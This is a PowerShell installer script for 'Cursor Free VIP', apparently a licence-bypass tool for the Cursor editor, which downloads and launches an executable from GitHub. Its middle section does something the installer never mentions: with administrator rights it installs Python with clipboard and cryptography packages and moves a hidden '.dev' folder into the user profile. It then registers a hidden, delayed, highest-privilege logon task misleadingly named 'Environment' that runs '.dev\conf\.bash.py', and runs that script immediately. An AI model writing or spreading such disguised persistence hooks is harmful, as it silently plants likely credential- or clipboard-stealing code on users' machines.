# set color theme
$Theme = @{
    Primary   = 'Cyan'
    Success   = 'Green'
    Warning   = 'Yellow'
    Error     = 'Red'
    Info      = 'White'
}

# ASCII Logo
$Logo = @"
   ██████╗██╗   ██╗██████╗ ███████╗ ██████╗ ██████╗      ██████╗ ██████╗  ██████╗   
  ██╔════╝██║   ██║██╔══██╗██╔════╝██╔═══██╗██╔══██╗     ██╔══██╗██╔══██╗██╔═══██╗  
  ██║     ██║   ██║██████╔╝███████╗██║   ██║██████╔╝     ██████╔╝██████╔╝██║   ██║  
  ██║     ██║   ██║██╔══██╗╚════██║██║   ██║██╔══██╗     ██╔═══╝ ██╔══██╗██║   ██║  
  ╚██████╗╚██████╔╝██║  ██║███████║╚██████╔╝██║  ██║     ██║     ██║  ██║╚██████╔╝  
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝     ╚═╝     ╚═╝  ╚═╝ ╚═════╝  
"@

# Beautiful Output Function
function Write-Styled {
    param (
        [string]$Message,
        [string]$Color = $Theme.Info,
        [string]$Prefix = "",
        [switch]$NoNewline
    )
    $symbol = switch ($Color) {
        $Theme.Success { "[OK]" }
        $Theme.Error   { "[X]" }
        $Theme.Warning { "[!]" }
        default        { "[*]" }
    }
    
    $output = if ($Prefix) { "$symbol $Prefix :: $Message" } else { "$symbol $Message" }
    if ($NoNewline) {
        Write-Host $output -ForegroundColor $Color -NoNewline
    } else {
        Write-Host $output -ForegroundColor $Color
    }
}

# Check administrator privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Styled '需要管理员权限，请右键以管理员身份运行' -Color $Theme.Error -Prefix '权限'
    exit 1
}

# Show Logo
Write-Host $Logo -ForegroundColor $Theme.Primary

# Get current user
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Write-Styled "当前用户: $currentUser" -Color $Theme.Info -Prefix '用户'

# Check Python
try {
    python --version | Out-Null
    Write-Styled '已检测到Python' -Color $Theme.Success -Prefix 'Python'
} catch {
    Write-Styled '未检测到Python，正在下载安装...' -Color $Theme.Warning -Prefix 'Python'
    $pythonUrl = 'https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe'
    $installerPath = "$env:TEMP\python-installer.exe"
    Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath
    Start-Process -FilePath $installerPath -ArgumentList '/quiet', 'InstallAllUsers=1', 'PrependPath=1' -Wait
    Remove-Item $installerPath
    $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
    Write-Styled 'Python 安装完成' -Color $Theme.Success -Prefix 'Python'
}

# Check and install pip dependencies
$requirements = @(
    @{Name='requests'; Version='2.31.0'},
    @{Name='pyperclip'; Version='1.8.2'},
    @{Name='cryptography'; Version='42.0.0'}
)
foreach ($pkg in $requirements) {
    $pkgName = $pkg.Name
    $pkgVersion = $pkg.Version
    try {
        $checkCmd = "import pkg_resources; pkg_resources.get_distribution('$pkgName').version"
        $version = python -c $checkCmd 2>$null
        if ([version]$version -lt [version]$pkgVersion) {
            throw
        }
        Write-Styled "$pkgName 已满足版本要求 ($version)" -Color $Theme.Success -Prefix '依赖'
    } catch {
        Write-Styled "正在安装 $pkgName >= $pkgVersion ..." -Color $Theme.Warning -Prefix '依赖'
        python -m pip install "$pkgName>=$pkgVersion" --user
    }
}

# Environment variables and scheduled tasks
if (Test-Path '.dev') {
    $destDir = "$env:USERPROFILE\.dev"
    if (Test-Path $destDir) {
        Remove-Item -Path $destDir -Recurse -Force
    }
    Move-Item -Path '.dev' -Destination $destDir -Force
    $scriptPath = "$destDir\conf\.bash.py"
    if (-not (Test-Path $scriptPath)) {
        Write-Styled "未找到脚本: $scriptPath" -Color $Theme.Error -Prefix '环境'
        exit 1
    }
    $taskName = 'Environment'
    $pythonPath = (Get-Command python | Select-Object -ExpandProperty Source)
    $action = New-ScheduledTaskAction -Execute $pythonPath -Argument "`"$scriptPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $currentUser
    $trigger.Delay = 'PT30M'
    $principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
    Write-Styled '已注册计划任务' -Color $Theme.Success -Prefix '计划任务'
    & $pythonPath $scriptPath
    Write-Styled '已执行环境脚本' -Color $Theme.Success -Prefix '环境'
} else {
    Write-Styled '未找到 .dev 目录，跳过环境变量与计划任务设置' -Color $Theme.Warning -Prefix '环境'
}

# Get latest version number function
function Get-LatestVersion {
    try {
        $latestRelease = Invoke-RestMethod -Uri "https://api.github.com/repos/yeongpin/cursor-free-vip/releases/latest"
        return @{
            Version = $latestRelease.tag_name.TrimStart('v')
            Assets = $latestRelease.assets
        }
    } catch {
        Write-Styled $_.Exception.Message -Color $Theme.Error -Prefix "Error"
        throw "Cannot get latest version"
    }
}

# Show version information
$releaseInfo = Get-LatestVersion
$version = $releaseInfo.Version
Write-Host "Version $version" -ForegroundColor $Theme.Info
Write-Host "Created by YeongPin`n" -ForegroundColor $Theme.Info

# Set TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Main installation function
function Install-CursorFreeVIP {
    Write-Styled "Start downloading Cursor Free VIP" -Color $Theme.Primary -Prefix "Download"
    
    try {
        # Get latest version
        Write-Styled "Checking latest version..." -Color $Theme.Primary -Prefix "Update"
        $releaseInfo = Get-LatestVersion
        $version = $releaseInfo.Version
        Write-Styled "Found latest version: $version" -Color $Theme.Success -Prefix "Version"
        
        # Find corresponding resources
        $asset = $releaseInfo.Assets | Where-Object { $_.name -eq "CursorFreeVIP_${version}_windows.exe" }
        if (!$asset) {
            Write-Styled "File not found: CursorFreeVIP_${version}_windows.exe" -Color $Theme.Error -Prefix "Error"
            Write-Styled "Available files:" -Color $Theme.Warning -Prefix "Info"
            $releaseInfo.Assets | ForEach-Object {
                Write-Styled "- $($_.name)" -Color $Theme.Info
            }
            throw "Cannot find target file"
        }
        
        # Check if Downloads folder already exists for the corresponding version
        $DownloadsPath = [Environment]::GetFolderPath("UserProfile") + "\Downloads"
        $downloadPath = Join-Path $DownloadsPath "CursorFreeVIP_${version}_windows.exe"
        
        if (Test-Path $downloadPath) {
            Write-Styled "Found existing installation file" -Color $Theme.Success -Prefix "Found"
            Write-Styled "Location: $downloadPath" -Color $Theme.Info -Prefix "Location"
            
            # Check if running with administrator privileges
            $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
            
            if (-not $isAdmin) {
                Write-Styled "Requesting administrator privileges..." -Color $Theme.Warning -Prefix "Admin"
                
                # Create new process with administrator privileges
                $startInfo = New-Object System.Diagnostics.ProcessStartInfo
                $startInfo.FileName = $downloadPath
                $startInfo.UseShellExecute = $true
                $startInfo.Verb = "runas"
                
                try {
                    [System.Diagnostics.Process]::Start($startInfo)
                    Write-Styled "Program started with admin privileges" -Color $Theme.Success -Prefix "Launch"
                    return
                }
                catch {
                    Write-Styled "Failed to start with admin privileges. Starting normally..." -Color $Theme.Warning -Prefix "Warning"
                    Start-Process $downloadPath
                    return
                }
            }
            
            # If already running with administrator privileges, start directly
            Start-Process $downloadPath
            return
        }
        
        Write-Styled "No existing installation file found, starting download..." -Color $Theme.Primary -Prefix "Download"
        
        # Create WebClient and add progress event
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "PowerShell Script")

        # Define progress variables
        $Global:downloadedBytes = 0
        $Global:totalBytes = 0
        $Global:lastProgress = 0
        $Global:lastBytes = 0
        $Global:lastTime = Get-Date

        # Download progress event
        $eventId = [guid]::NewGuid()
        Register-ObjectEvent -InputObject $webClient -EventName DownloadProgressChanged -Action {
            $Global:downloadedBytes = $EventArgs.BytesReceived
            $Global:totalBytes = $EventArgs.TotalBytesToReceive
            $progress = [math]::Round(($Global:downloadedBytes / $Global:totalBytes) * 100, 1)
            
            # Only update display when progress changes by more than 1%
            if ($progress -gt $Global:lastProgress + 1) {
                $Global:lastProgress = $progress
                $downloadedMB = [math]::Round($Global:downloadedBytes / 1MB, 2)
                $totalMB = [math]::Round($Global:totalBytes / 1MB, 2)
                
                # Calculate download speed
                $currentTime = Get-Date
                $timeSpan = ($currentTime - $Global:lastTime).TotalSeconds
                if ($timeSpan -gt 0) {
                    $bytesChange = $Global:downloadedBytes - $Global:lastBytes
                    $speed = $bytesChange / $timeSpan
                    
                    # Choose appropriate unit based on speed
                    $speedDisplay = if ($speed -gt 1MB) {
                        "$([math]::Round($speed / 1MB, 2)) MB/s"
                    } elseif ($speed -gt 1KB) {
                        "$([math]::Round($speed / 1KB, 2)) KB/s"
                    } else {
                        "$([math]::Round($speed, 2)) B/s"
                    }
                    
                    Write-Host "`rDownloading: $downloadedMB MB / $totalMB MB ($progress%) - $speedDisplay" -NoNewline -ForegroundColor Cyan
                    
                    # Update last data
                    $Global:lastBytes = $Global:downloadedBytes
                    $Global:lastTime = $currentTime
                }
            }
        } | Out-Null

        # Download completed event
        Register-ObjectEvent -InputObject $webClient -EventName DownloadFileCompleted -Action {
            Write-Host "`r" -NoNewline
            Write-Styled "Download completed!" -Color $Theme.Success -Prefix "Complete"
            Unregister-Event -SourceIdentifier $eventId
        } | Out-Null

        # Start download
        $webClient.DownloadFileAsync([Uri]$asset.browser_download_url, $downloadPath)

        # Wait for download to complete
        while ($webClient.IsBusy) {
            Start-Sleep -Milliseconds 100
        }
        
        Write-Styled "File location: $downloadPath" -Color $Theme.Info -Prefix "Location"
        Write-Styled "Starting program..." -Color $Theme.Primary -Prefix "Launch"
        
        # Run program
        Start-Process $downloadPath
    }
    catch {
        Write-Styled $_.Exception.Message -Color $Theme.Error -Prefix "Error"
        throw
    }
}

# Execute installation
try {
    Install-CursorFreeVIP
}
catch {
    Write-Styled "Download failed" -Color $Theme.Error -Prefix "Error"
    Write-Styled $_.Exception.Message -Color $Theme.Error
}
finally {
    Write-Host "`nPress any key to exit..." -ForegroundColor $Theme.Info
    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
}
